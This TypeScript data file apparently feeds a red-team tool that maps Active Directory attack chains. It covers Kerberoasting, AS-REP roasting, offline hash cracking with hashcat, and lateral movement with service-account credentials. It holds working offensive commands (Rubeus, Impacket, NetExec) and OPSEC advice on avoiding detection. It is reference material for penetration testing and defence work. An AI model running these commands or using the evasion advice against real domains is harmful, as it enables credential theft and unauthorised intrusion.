import type { AttackEdge, TechniqueNodeDef } from '../schema';

const mitre = (id: string): { id: string; url: string } => ({
  id,
  url: `https://attack.mitre.org/techniques/${id.replace('.', '/')}/`,
});

/**
 * Chain 2: "Valid user → roast → crack → service-account creds → lateral".
 * Branches from `valid-domain-creds` and converges into `lateral-movement-cme`,
 * which also receives Pass-the-Hash from chain 1.
 */
export const credentialAccessNodes: TechniqueNodeDef[] = [
  {
    id: 'kerberoasting',
    label: 'Kerberoasting',
    phase: 'credential-access',
    needs: 'domain-user',
    summary: 'Request TGS for SPN accounts, crack offline.',
    description:
      'Any authenticated user can request a service ticket (TGS) for accounts with a Service Principal Name. Part of that ticket is encrypted with the service account\'s password hash, so it can be cracked offline with no special privileges needed, and service accounts are often over-privileged.',
    tools: [
      { name: 'Rubeus', url: 'https://github.com/GhostPack/Rubeus' },
      { name: 'GetUserSPNs (Impacket)', url: 'https://github.com/fortra/impacket' },
      { name: 'bloodyAD', url: 'https://github.com/CravateRouge/bloodyAD' },
    ],
    commands: [
      {
        label: 'Find Kerberoastable accounts (bloodyAD)',
        code: "bloodyAD -u user -p pass -d domain.local --host dc01 get search --filter '(&(servicePrincipalName=*)(!(objectClass=computer)))' --attr sAMAccountName,servicePrincipalName",
        lang: 'bash',
      },
      {
        label: 'Roast from Linux',
        code: 'GetUserSPNs.py DOMAIN/user:pass -dc-ip 10.0.0.1 -request',
        lang: 'bash',
      },
      {
        label: 'Roast from Windows (OPSEC: only RC4-vulnerable)',
        code: 'Rubeus.exe kerberoast /nowrap /rc4opsec',
        lang: 'powershell',
      },
    ],
    requires: ['Any valid domain account', 'Target accounts with an SPN set'],
    mitre: mitre('T1558.003'),
    opsec: 'Requesting many TGS quickly, or requesting RC4 (etype 0x17) when AES is available, triggers detections (Event ID 4769). Throttle and prefer accounts that only support RC4.',
    references: [
      { label: 'HackTricks, Kerberoast', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/kerberoast.html' },
      { label: 'harmj0y, Kerberoasting Revisited', url: 'https://blog.harmj0y.net/redteaming/kerberoasting-revisited/' },
    ],
  },
  {
    id: 'asrep-roasting',
    label: 'AS-REP Roasting',
    phase: 'credential-access',
    needs: 'none',
    summary: 'Roast accounts with pre-auth disabled.',
    description:
      'Accounts with "Do not require Kerberos pre-authentication" set will return an AS-REP containing data encrypted with the account\'s key, crackable offline. You can enumerate these even without credentials if you have a user list.',
    tools: [
      { name: 'Rubeus', url: 'https://github.com/GhostPack/Rubeus' },
      { name: 'GetNPUsers (Impacket)', url: 'https://github.com/fortra/impacket' },
      { name: 'bloodyAD', url: 'https://github.com/CravateRouge/bloodyAD' },
    ],
    commands: [
      {
        label: 'Find AS-REP-roastable accounts (bloodyAD)',
        code: "bloodyAD -u user -p pass -d domain.local --host dc01 get search --filter '(userAccountControl:1.2.840.113556.1.4.803:=4194304)' --attr sAMAccountName",
        lang: 'bash',
      },
      {
        label: 'Find + roast pre-auth-disabled accounts',
        code: 'GetNPUsers.py DOMAIN/ -usersfile users.txt -dc-ip 10.0.0.1 -no-pass',
        lang: 'bash',
      },
    ],
    requires: ['A user list (creds optional)', 'Accounts with pre-auth disabled'],
    mitre: mitre('T1558.004'),
    opsec: 'Bulk AS-REQ enumeration generates many 4768 events. Spread requests out and target known accounts.',
    references: [
      { label: 'HackTricks, ASREPRoast', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/asreproast.html' },
      { label: 'harmj0y, Roasting AS-REPs', url: 'https://blog.harmj0y.net/redteaming/roasting-as-reps/' },
    ],
  },
  {
    id: 'crack-hash-offline',
    label: 'Crack Hash Offline',
    phase: 'credential-access',
    needs: 'none',
    summary: 'Recover the cleartext from a roasted ticket.',
    description:
      'Both Kerberoast (TGS) and AS-REP outputs are crackable offline with a wordlist + rules. A cracked service-account or user password becomes your next identity. This node converges the two roasting branches.',
    tools: [
      { name: 'hashcat', url: 'https://hashcat.net/hashcat/' },
      { name: 'john', url: 'https://www.openwall.com/john/' },
    ],
    commands: [
      {
        label: 'Kerberoast TGS (mode 13100)',
        code: 'hashcat -m 13100 tgs.txt rockyou.txt -r rules/best64.rule',
        lang: 'bash',
      },
      {
        label: 'AS-REP (mode 18200)',
        code: 'hashcat -m 18200 asrep.txt rockyou.txt -r rules/best64.rule',
        lang: 'bash',
      },
    ],
    requires: ['A roasted ticket/hash', 'A weak-enough password'],
    mitre: mitre('T1110.002'),
    opsec: 'Offline and invisible to the target. Strong/AES-only passwords resist this; escalate via a different branch if cracking fails.',
  },
  {
    id: 'service-account-creds',
    label: 'Service Account Creds',
    phase: 'lateral-movement',
    needs: 'domain-user',
    summary: 'Often over-privileged. Reuse them.',
    description:
      'Cracked service accounts frequently have local admin on many servers, or membership in privileged groups. Validate where these creds are admin, then move.',
    tools: [{ name: 'NetExec', url: 'https://github.com/Pennyw0rth/NetExec' }],
    commands: [
      {
        label: 'Find where the account is local admin',
        code: 'nxc smb hosts.txt -u svc_sql -p Summer2024! | grep Pwn3d',
        lang: 'bash',
      },
    ],
    requires: ['Cracked service-account credentials'],
    mitre: mitre('T1078.002'),
  },
  {
    id: 'lateral-movement-cme',
    label: 'Remote Execution',
    phase: 'lateral-movement',
    needs: 'domain-user',
    hub: true, // the creds-reuse / remote-exec convergence hub
    summary: 'Pick a transport to run code on another host.',
    description:
      'Reuse credentials, an NT hash (PtH), or a ticket (PtT) to run code on another host, hunting for a session belonging to a more privileged user or a route to a Domain Controller. Choose the channel by what you hold on the target: local admin yields SYSTEM via service (PsExec/SMBExec), scheduled-task, WMI, or DCOM exec; Remote Management Users gives WinRM and Remote Desktop Users gives RDP; a plain service login is enough for SSH or MSSQL. So "remote exec" does not always mean local admin, and you do not always land as one. Match the transport to the access you actually have.',
    tools: [
      { name: 'NetExec', url: 'https://github.com/Pennyw0rth/NetExec' },
      { name: 'Impacket (psexec/smbexec/atexec/wmiexec/dcomexec)', url: 'https://github.com/fortra/impacket' },
    ],
    commands: [
      {
        label: 'Find where your creds are admin, then exec',
        code: 'nxc smb hosts.txt -u svc_sql -p Summer2024! -x "whoami /groups"',
        lang: 'bash',
      },
      {
        label: 'Run a PowerShell command (-X)',
        code: "nxc smb <host> -u user -p pass -X '$PSVersionTable'",
        lang: 'bash',
      },
      {
        label: 'Hunt logged-on users to find a pivot',
        code: 'nxc smb 10.0.0.0/24 -u user -p pass --loggedon-users',
        lang: 'bash',
      },
    ],
    requires: [
      'Credentials, an NT hash (PtH), or a Kerberos ticket (PtT)',
      'Authorization on the target: local admin, a remote-access group, or a valid service login',
    ],
    mitre: mitre('T1021'),
    opsec: 'Each hop generates logon events (4624) keyed to the transport: type 3 for SMB/WMI, type 10 for RDP. Reuse legitimate admin tooling and change windows to blend in; do not spray every host at once.',
  },
];

export const credentialAccessEdges: AttackEdge[] = [
  // valid-domain-creds -> kerberoasting/asrep-roasting now route through the
  // 'Kerberos Roasting' category (see ad-categories.ts).
  { source: 'kerberoasting', target: 'crack-hash-offline' },
  { source: 'asrep-roasting', target: 'crack-hash-offline' },
  { source: 'crack-hash-offline', target: 'service-account-creds', label: 'service / SPN account' },
  { source: 'crack-hash-offline', target: 'valid-domain-creds', label: 'domain user account' },
  { source: 'service-account-creds', target: 'lateral-movement-cme' },
  { source: 'pass-the-hash', target: 'lateral-movement-cme' },
];
